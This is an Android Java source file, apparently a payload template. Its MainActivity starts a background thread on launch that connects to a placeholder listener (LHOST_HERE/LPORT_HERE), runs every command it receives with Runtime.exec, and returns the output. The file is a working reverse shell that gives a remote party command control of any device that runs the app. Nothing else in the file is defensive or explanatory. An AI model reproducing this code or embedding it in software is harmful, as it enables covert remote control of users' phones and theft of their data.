package com.monitor.payload;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import java.net.Socket;
import java.io.*;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new Thread(() -> {
            try {
                Socket socket = new Socket("LHOST_HERE", LPORT_HERE);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintStream out = new PrintStream(socket.getOutputStream());
                String cmd;
                while ((cmd = in.readLine()) != null) {
                    try {
                        Process proc = Runtime.getRuntime().exec(cmd);
                        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                        StringBuilder output = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            output.append(line).append("\n");
                        }
                        out.println(output.toString());
                        out.flush();
                    } catch (Exception ex) {
                        out.println("Error: " + ex.getMessage());
                        out.flush();
                    }
                }
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
